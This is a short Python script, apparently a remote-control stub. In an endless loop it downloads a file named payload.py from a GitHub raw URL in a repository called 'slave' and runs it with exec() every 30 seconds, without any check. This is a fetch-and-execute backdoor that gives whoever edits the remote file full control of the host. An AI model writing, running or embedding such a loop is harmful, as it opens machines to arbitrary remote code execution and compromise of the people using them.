from gzip import READ
from urllib.request import urlopen
from time import sleep

while True:
    with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/test_payload/payload.py') as payload:
        exec(payload.read())

    sleep(30)